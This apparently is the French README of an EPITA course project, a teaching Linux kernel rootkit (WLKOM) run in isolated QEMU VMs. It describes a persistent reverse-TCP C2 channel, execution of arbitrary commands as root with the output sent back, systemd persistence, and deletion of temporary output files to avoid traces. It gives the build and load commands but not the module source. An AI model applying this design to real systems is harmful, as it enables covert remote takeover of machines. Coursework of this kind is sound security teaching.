# WLKOM — Wild Linux Kernel Object Module

Rootkit pédagogique développé dans le cadre du projet SYS2 (EPITA).
Le rootkit est un module kernel Linux (LKM) qui s'installe sur une machine victime et permet
à un programme attaquant distant de la contrôler via une connexion TCP persistante.

---

## Structure du projet

```
.
├── AUTHORS
├── README.md
├── TODO
├── DESIGN.md                    # Choix d'architecture et justification des tests
├── epirootkit-subject.pdf
├── vm.sh                        # Script QEMU : crée et lance les deux VMs
├── tests/                       # Tests automatisés locaux
│   ├── README.md
│   └── run_tests.py
├── vmshare/                     # Dossier partagé hôte ↔ VMs (VirtFS/9p)
│   ├── rootkit/                 # Copie de travail compilée sur la victime
│   └── attacking_program/       # Copie de travail compilée sur l'attaquant
├── rootkit/                     # Code source du module kernel (victim)
│   ├── Makefile
│   ├── install_persistence.sh    # Installe le module comme service systemd
│   └── wlkom.c
└── attacking_program/           # Code source du programme C2 (attaquant)
    ├── Makefile
    └── c2.c

```

---

## Environnement

### Hyperviseur

**QEMU/KVM** — imposé par le sujet (section 4.5).

### Machine hôte

Arch Linux (laptop école). Les deux VMs doivent tourner dessus.

### VM Victime

| Critère | Choix | Justification |
|---|---|---|
| Distro | **Debian 12 (Bookworm)** | Kernel stable, pas de mise à jour automatique qui casserait le `.ko` |
| Kernel | **6.1 LTS** (fourni par défaut avec Debian 12) | LTS = pas de changements d'API kernel inattendus entre deux sessions de travail. Kernel >= 5.0 requis par le sujet |
| Headers | `linux-headers-$(uname -r)` via `apt` | Trivial à installer, version garantie identique au kernel en cours |
| Sécurités kernel | Désactivées : `CONFIG_MODULE_SIG`, `CONFIG_LOCKDOWN_KERNEL` | Rootkit pédagogique — ces protections empêchent le chargement de modules non signés. Documentées ici pour justification auprès du correcteur |

**Pourquoi pas Arch Linux pour la victim ?**
Arch est rolling-release : une mise à jour du kernel peut casser le module entre deux sessions.
Avec Debian 12 stable, le kernel ne change pas sans intervention explicite.

### VM Attaquante

| Critère | Choix | Justification |
|---|---|---|
| Distro | **Arch Linux** | Même environnement que la machine hôte, outils à jour, familier |
| Rôle | Héberge uniquement le programme C2 (écoute TCP, envoie les commandes) | Pas de contrainte kernel — n'importe quelle distro convient |

---

## Prérequis sur la machine hôte

```bash
sudo pacman -S qemu-full cdrtools wget openssl
```

## Setup des VMs

```bash
# Démarrer l'attaquant en premier (il écoute sur le socket vmnet)
./vm.sh attacker   # dans un terminal

# Puis la victime (elle se connecte au socket)
./vm.sh victim     # dans un autre terminal
```

Le script est **idempotent** : le relancer ne recrée pas ce qui existe déjà (les `.qcow2` sont préservés).
Attendre l'apparition du prompt `login:` dans la fenêtre GTK (3–5 min, cloud-init installe les packages).

**Recréer une VM après modification de `vm.sh`** (cloud-init ne s'applique qu'au premier boot) :

```bash
# Recréer l'attaquant
rm vms/attacker.qcow2 vms/attacker-seed.iso
./vm.sh attacker

# Recréer la victime
rm vms/victim.qcow2 vms/victim-seed.iso
./vm.sh victim

# Recréer les deux (les images de base sont conservées, pas de re-téléchargement)
rm vms/attacker.qcow2 vms/attacker-seed.iso vms/victim.qcow2 vms/victim-seed.iso
./vm.sh attacker   # terminal 1
./vm.sh victim     # terminal 2
```

**Ce que fait le script au premier lancement :**

| Étape | Action |
|---|---|
| 1 | Télécharge la cloud image Debian 12 ou Arch Linux (une seule fois) |
| 2 | Copie l'image de base et redimensionne le disque |
| 3 | Génère un seed ISO cloud-init (user, réseau, packages, SSH) |
| 4 | Lance QEMU/KVM avec les deux interfaces réseau |

**Pourquoi cloud images + cloud-init plutôt qu'ISO + install manuelle ?**
Les cloud images sont des disques pré-installés. cloud-init configure la VM au 1er boot
sans intervention humaine : création du user, mot de passe hashé, packages, clavier, réseau.
Résultat : `./vm.sh attacker` suffit, zéro clic, 100% reproductible.

**Pourquoi QEMU direct plutôt que libvirt ?**
libvirt ajoute une couche d'abstraction (daemon, XML, réseau virtuel géré) inutile ici.
QEMU en ligne de commande suffit pour deux VMs locales et évite de nécessiter les droits
d'administration pour gérer le daemon libvirtd.

## Architecture réseau

Chaque VM a deux interfaces réseau :

```
Hôte ──(SLIRP user0)── eth0  [10.0.2.x/24, DHCP]   ← SSH depuis l'hôte
                        vmnet [192.168.100.x/24, statique] ← trafic C2 inter-VM
```

| Interface | Rôle | Mécanisme QEMU |
|---|---|---|
| `eth0` (user0) | SSH depuis l'hôte (`localhost:1002x`) | SLIRP + `hostfwd` |
| `vmnet` | Réseau isolé entre les deux VMs | `socket` (listen/connect sur `localhost:1234`) |

**Pourquoi deux interfaces séparées ?**
Le trafic C2 (vmnet) ne doit pas transiter par la stack réseau de l'hôte.
Le réseau socket QEMU crée un L2 direct entre les deux VMs, invisible depuis l'hôte.

**Pourquoi des MACs explicites sur `eth0` (user0) ?**
cloud-init écrit les fichiers de configuration réseau (systemd-networkd) pendant le
stage `init-local`, **avant** que `systemd-networkd` démarre. Ce mécanisme ne fonctionne
que pour les interfaces matchées par MAC dans `network-config` : les matchs par nom
(`eth*`, `en*`) sont traités trop tard (stage `init-network`, ~1 s après le démarrage
de networkd), laissant l'interface `unmanaged`. En assignant un MAC fixe à chaque
interface SLIRP et en le référençant dans `network-config`, on garantit que le fichier
networkd est présent au bon moment.

**IPs fixes :**
- Attaquant vmnet : `192.168.100.10`
- Victime vmnet   : `192.168.100.20`

L'IP de l'attaquant est passée au module kernel via `module_param` au `insmod`.

**SSH :**
- Attaquant : `ssh -p 10023 epita@localhost`  (mdp : `epita`)
- Victime   : `ssh -p 10022 epita@localhost`  (mdp : `epita`)

**Erreur "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED" :**
Se produit après une recréation de VM (nouvelles clés SSH générées). Supprimer l'ancienne entrée :
```bash
ssh-keygen -R "[localhost]:10023"   # attaquant
ssh-keygen -R "[localhost]:10022"   # victime
```

**Pourquoi `PasswordAuthentication yes` explicite sur l'attaquant (Arch) ?**
L'image cloud Arch Linux désactive l'authentification par mot de passe dans sshd et
positionne sshd avec `preset: disabled` — il ne démarre pas automatiquement au boot.
Le `runcmd` cloud-init réactive les deux explicitement.

## État des VMs après le premier boot

| VM | Distro | Packages pré-installés |
|---|---|---|
| Victime | Debian 12 | `build-essential`, `linux-headers-amd64`, `git` |
| Attaquant | Arch Linux | `base-devel`, `git` |

La victime a tout le nécessaire pour compiler un module kernel (`make`, headers correspondant
au kernel en cours, gcc). L'attaquant a les outils de build pour compiler le programme C2.

## Dossier partagé (vmshare)

`vmshare/` à la racine du projet est monté dans les deux VMs via VirtFS (9p) :

```
Hôte     : ./vmshare/
Victime  : /mnt/vmshare/
Attaquant: /mnt/vmshare/
```

Utilisation typique — copier les sources vers la victime pour compilation :

```bash
# Depuis l'hôte
cp -r rootkit/ vmshare/

# Depuis la victime
cd /mnt/vmshare/rootkit && make
```

Ensuite, soit charger le module en mode manuel sans persistance :

```bash
sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
```

soit installer la persistance, ce qui est le mode recommandé une fois la feature Persistence utilisée :

```bash
sudo ./install_persistence.sh 192.168.100.10 4444
sudo systemctl restart wlkom.service
```

Le montage est configuré automatiquement par cloud-init (`/etc/fstab` via directive `mounts`).
Si besoin de monter manuellement : `sudo mount -t 9p -o trans=virtio hostshare /mnt/vmshare`.

---

## Compilation du module kernel

La compilation se fait **sur la VM victime** (les headers doivent correspondre exactement
au kernel en cours d'exécution).

```bash
# Sur la VM victime
cd rootkit/
make
```

Cible `modules` : génère `wlkom.ko`.
Cible `clean` : supprime les artefacts de compilation.

**Pourquoi compiler sur la VM et non sur l'hôte ?**
Le Makefile utilise `/lib/modules/$(uname -r)/build`. Si on compile sur l'hôte Arch
(kernel 6.x rolling) pour une victim Debian (kernel 6.1 LTS), les headers ne matchent
pas et la compilation échoue ou produit un module incompatible.

---

## Chargement du module

Deux modes existent.

Mode manuel sans persistance, utile pour tester rapidement le `.ko` courant :

```bash
# Sur la VM victime
sudo insmod wlkom.ko password_hash=<HASH_FNV1A> c2_ip=<IP_ATTAQUANT> c2_port=4444
sudo dmesg | tail    # vérifier "wlkom: loaded"

# Déchargement
sudo rmmod wlkom
```

Mode persistant, recommandé après validation :

```bash
# Sur la VM victime
sudo ./install_persistence.sh <IP_ATTAQUANT> 4444
sudo systemctl restart wlkom.service
sudo systemctl --no-pager status wlkom.service
```

Dans ce mode, `password_hash`, `c2_ip` et `c2_port` sont stockés dans `/etc/modprobe.d/wlkom.conf`, puis appliqués automatiquement par `modprobe wlkom` au démarrage du service.

---

## Tests

Les tests automatisés locaux sont dans `tests/` :

```bash
python3 tests/run_tests.py
```

Ils vérifient les features déjà implémentées côté source : Makefile LKM pour `wlkom.ko`, logique de connexion reverse TCP avec retry, build du C2, obligation du mot de passe côté C2, calcul FNV-1a, envoi de la trame `AUTH <hash_fnv1a>` et validation de l'authentification côté module kernel. Le chargement réel de `wlkom.ko` reste à tester dans la VM victime, car il dépend du kernel en cours et de ses headers.


## Features

### Compile (0.5pt) — DONE



Makefile LKM standard ciblant `wlkom.ko`.
Voir [rootkit/Makefile](rootkit/Makefile).

### Connection (3pt) — DONE

#### Fonctionnement

Au chargement du module (`insmod`), un **kthread kernel** (`wlkom_conn`) est lancé.
Il tourne en arrière-plan dans le kernel et gère le cycle de vie de la connexion TCP vers le C2.

```
insmod wlkom.ko
    └─ wlkom_init()
         └─ kthread_run(connection_thread)
                │
                ▼
         ┌─────────────────────────────────────────┐
         │  while (!kthread_should_stop())          │
         │                                          │
         │    do_connect()                          │
         │      sock_create(AF_INET, SOCK_STREAM)   │
         │      sock->ops->connect(c2_ip, c2_port)  │
         │                                          │
         │    si échec → pr_err + sleep 5s → retry  │
         │                                          │
         │    si succès → pr_info "connected"       │
         │      kernel_recvmsg() loop               │
         │        (bloquant, détecte déconnexion)   │
         │      ret == 0 → C2 fermé                 │
         │      ret < 0  → erreur réseau            │
         │      → shutdown + sock_release + retry   │
         └─────────────────────────────────────────┘
                │
         rmmod wlkom
              └─ wlkom_exit()
                   ├─ kernel_sock_shutdown()  ← débloque recvmsg
                   ├─ kthread_stop()          ← attend la fin du thread
                   └─ sock_release()
```

**Pourquoi `kernel_sock_shutdown` avant `kthread_stop` ?**
`kthread_stop` est bloquant — il attend que le thread retourne. Si le thread est bloqué
sur `kernel_recvmsg`, il n'en sort jamais sans une interruption externe. Le `shutdown`
ferme le socket côté kernel, ce qui fait retourner `recvmsg` avec une erreur,
permettant au thread de tester `kthread_should_stop()` et de sortir proprement.

**Pourquoi `schedule_timeout_interruptible` plutôt que `ssleep` pour le retry ?**
`schedule_timeout_interruptible` rend le thread interruptible pendant l'attente :
`kthread_stop` peut le réveiller immédiatement sans attendre les 5 secondes.
Avec `ssleep`, le `rmmod` bloquerait 5s à chaque retry en cours.

#### Paramètres

| Paramètre | Défaut | Description |
|---|---|---|
| `c2_ip` | `192.168.100.10` | IP de la VM attaquante (définie dans `vm.sh`) |
| `c2_port` | `4444` | Port TCP du C2 (défini dans `vm.sh`) |

Les valeurs par défaut correspondent à l'infra `vm.sh`. Les passer explicitement à l'`insmod`
n'est nécessaire que si on utilise une autre configuration réseau.

#### Fichiers

| Fichier | Rôle |
|---|---|
| [rootkit/wlkom.c](rootkit/wlkom.c) | Module kernel — kthread + socket TCP |
| [attacking_program/c2.c](attacking_program/c2.c) | Serveur C2 userland |
| [attacking_program/Makefile](attacking_program/Makefile) | Build du C2 |

#### Étapes pour tester la connexion

**1. Compiler et lancer le C2 sur la VM attaquante**

```bash
# SSH vers l'attaquant
ssh -p 10023 epita@localhost   # mdp : epita

# Compiler (une seule fois)
cd /mnt/vmshare/attacking_program && make

# Lancer le C2
./c2 4444 test
# → C2 listening on port 4444
# → [HH:MM:SS] [?] Waiting for rootkit connection...
```

**2. Compiler et charger le module sur la VM victime**

```bash
# SSH vers la victime (dans un autre terminal)
ssh -p 10022 epita@localhost   # mdp : epita

# Compiler (une seule fois, doit se faire sur la victime)
cd /mnt/vmshare/rootkit && make

# Charger le module en mode manuel, sans persistance
# Exemple pour le mot de passe test : password_hash=afd071e5
sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
```

**3. Vérifier la connexion**

Sur l'attaquant, le C2 affiche :
```
[HH:MM:SS] [+] Rootkit connected from 192.168.100.20
```

Sur la victime, voir les logs kernel en temps réel :
```bash
sudo dmesg -w
# → wlkom: loaded
# → wlkom: connected to C2 192.168.100.10:4444
```

**4. Tester le retry**

Couper le C2 (`Ctrl+C`) — la victime affiche dans `dmesg` :
```
wlkom: disconnected from C2, retrying
wlkom: C2 unreachable (-111), retry in 5s
...
```
Relancer `./c2 4444 test` — reconnexion automatique sans toucher à la victime.

**5. Décharger le module**

```bash
# Sur la victime
sudo rmmod wlkom
# → dmesg : "wlkom: unloaded"
```

Sur l'attaquant :
```
[HH:MM:SS] [-] Rootkit disconnected
[HH:MM:SS] [?] Waiting for rootkit connection...
```

### Persistence (1.5pt) — DONE

La persistance est assurée par un service systemd installé sur la VM victime. Le service charge `wlkom` via `modprobe` après `network-online.target`, ce qui laisse le temps à l'interface `vmnet` d'être configurée avant que le module tente de joindre le C2.

Le script [rootkit/install_persistence.sh](rootkit/install_persistence.sh) automatise l'installation :

1. demande le mot de passe en interactif ;
2. calcule son hash FNV-1a 32-bit ;
3. copie `wlkom.ko` dans `/lib/modules/$(uname -r)/extra/` ;
4. exécute `depmod -a` ;
5. écrit `/etc/modprobe.d/wlkom.conf` avec `password_hash`, `c2_ip` et `c2_port` ;
6. crée `/etc/systemd/system/wlkom.service` ;
7. active le service avec `systemctl enable`.

Exemple avec le mot de passe `test` :

```bash
# Sur la VM victime
cd /mnt/vmshare/rootkit
make
sudo ./install_persistence.sh 192.168.100.10 4444
sudo systemctl start wlkom.service
sudo systemctl status wlkom.service
```

Test après reboot :

```bash
# Sur l'attaquant
cd /mnt/vmshare/attacking_program
./c2 4444 test

# Sur la victime
sudo reboot
# après reconnexion SSH
lsmod | grep wlkom
sudo systemctl status wlkom.service
sudo dmesg | tail
```

Le log attendu côté victime contient `wlkom: loaded`, puis `wlkom: C2 authenticated` lorsque le C2 est disponible.

Pour désactiver la persistance :

```bash
sudo systemctl disable --now wlkom.service
sudo rm -f /etc/systemd/system/wlkom.service /etc/modprobe.d/wlkom.conf
sudo rm -f /lib/modules/$(uname -r)/extra/wlkom.ko
sudo depmod -a
```


### Password (1pt) — DONE

Le module ne stocke pas le mot de passe brut. Il reçoit seulement un hash FNV-1a 32-bit via le paramètre kernel `password_hash`. Avec la persistance activée, `install_persistence.sh` demande le mot de passe en interactif, calcule le hash, écrit ce hash dans `/etc/modprobe.d/wlkom.conf`, puis `modprobe wlkom` le relit automatiquement quand `wlkom.service` démarre.

Le module refuse de se charger si `password_hash` est absent ou vide (`-EINVAL`).

**Pourquoi un hash ?**
Le mot de passe brut n'est pas compilé dans `wlkom.ko` et n'est pas stocké comme paramètre module. Le module ne garde que le hash attendu. FNV-1a reste un hash simple non cryptographique, mais il suffit ici à ne pas transmettre/comparer directement le secret en clair.

**Pourquoi `module_param` ?**
C'est la façon idiomatique de passer de la configuration à un LKM sans hardcoder de valeur dans le binaire. Avec un mot de passe hardcodé, `strings wlkom.ko` l'exposerait immédiatement. Avec `module_param`, le `.ko` compilé ne contient aucun secret — le hash est fourni à l'exécution par l'opérateur qui charge le module ou par la configuration `modprobe`.

**Permissions sysfs (`0400`)** : le paramètre est lisible après chargement par root uniquement via `/sys/module/wlkom/parameters/password_hash`. Cela évite qu'un utilisateur non-privilégié puisse lire le hash depuis l'espace utilisateur.

À la connexion, le C2 calcule le hash FNV-1a du mot de passe reçu sur sa ligne de commande et envoie `AUTH <hash_fnv1a>` avant toute commande. Le rootkit compare cette valeur avec le `password_hash` reçu au chargement et ferme la connexion si le hash est incorrect.

Exemple avec le mot de passe `test`, dont le hash FNV-1a est `afd071e5`.

Mode persistant, recommandé après installation de la persistence :

```bash
# Sur l'attaquant
./c2 4444 test

# Sur la victime
cd /mnt/vmshare/rootkit
sudo ./install_persistence.sh 192.168.100.10 4444
# entrer test quand le script demande WLKOM password
sudo systemctl restart wlkom.service
sudo dmesg | tail
```

Pour tester un mauvais mot de passe en mode persistant, installer volontairement un hash différent puis redémarrer le service :

```bash
# Sur la victime
cd /mnt/vmshare/rootkit
sudo ./install_persistence.sh 192.168.100.10 4444
# entrer wrongpass quand le script demande WLKOM password
sudo systemctl restart wlkom.service
sudo dmesg | tail
```

Le C2 lancé avec `./c2 4444 test` enverra le hash de `test`, mais le module attendra le hash de `wrongpass`, donc les logs doivent contenir `wlkom: C2 authentication failed`.

Mode manuel sans persistance, utile seulement pour un test rapide :

```bash
# Sur la victime
sudo systemctl stop wlkom.service
sudo rmmod wlkom
sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
```

### Executing commands (5pt) — DONE

#### Fonctionnement

La fonctionnalité permet d'exécuter n'importe quelle commande ou script shell sur la VM victime avec les privilèges `root` (espace noyau) et d'en encapsuler l'intégralité des flux vers l'attaquant.


[ C2 Server ]             [ Rootkit (LKM) ]
                       │                           │
                 c2_shell> uname -a                │
                       │ ───────( TCP socket )───> │
                       │                           │ kernel_recvmsg()
                       │                           │ execute_and_send_output()
                       │                           │   └─ call_usermodehelper(UMH_WAIT_PROC)
                       │                           │        └─ /bin/sh -c "uname -a > /tmp/.out 2>&1"
                       │                           │
                       │ <──────( Exit Status )─── │ send_reply("[Exit Status: 0]")
                       │ <──────( stdout/stderr )─ │ kernel_read(/tmp/.wlkom_out) -> chunks
                       │ <──────( End Marker )──── │ send_reply("--- End of Output ---")
                       │                           │
                 c2_shell> _                       │


* **Attente synchrone du processus** : Le module utilise `call_usermodehelper` avec le flag `UMH_WAIT_PROC` pour bloquer le kthread jusqu'à la fin de la commande userland, assurant la capture complète des flux.

* **Encapsulation complète (stdout/stderr)** : Les descripteurs de fichiers standard et d'erreur sont redirigés via le shell (`> /tmp/.wlkom_out 2>&1`). Le fichier temporaire est ensuite ouvert et lu depuis l'espace noyau via `filp_open` / `kernel_read` pour être streamé par paquets TCP vers le C2.

* **Décodage de l'Exit Status** : Le code de retour brut renvoyé par le sous-système de fork du noyau est décodé à l'aide d'un décalage de bits (`(exit_status >> 8) & 0xFF`) afin de restituer un code de retour UNIX standard (ex: `2` pour un échec de `ls`).

* **Nettoyage automatique** : Une fois la transmission terminée, le fichier temporaire `/tmp/.wlkom_out` est immédiatement purgé du disque de la victime pour ne pas laisser de traces évidentes.


#### Étapes pour tester l'exécution des commandes

**1.Authetification**
Une fois le serveur C2 démarré et le module connecté, un prompt interactif persistant `c2_shell>` apparaît sur le terminal de l'attaquant.

**2. Exécuter une commande valide**
```text
c2_shell> uname -a
[Exit Status: 0]
--- Command Output ---
Linux epita-victim 6.1.0-48-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.172-1 (2026-05-15) x86_64 GNU/Linux

--- End of Output ---

### Upload / Download (1.5pt + 1.5pt) — TODO

### Cardboard box / Hide (1pt + 2pt + 2pt) — TODO

### Crypto (1pt) — TODO

---

## Déploiement complet (étapes headmaster)

1. Installer QEMU/KVM/libvirt sur la machine hôte Arch Linux (voir Prérequis)
2. Lancer `./setup_vms.sh` — crée et configure les deux VMs
3. Sur la VM attaquante : lancer le programme C2 (`attacking_program/`)
4. Sur la VM victime : compiler le module (`make`) puis le charger (`insmod`) ou installer la persistance (`install_persistence.sh`)
5. Vérifier la connexion dans les logs du C2
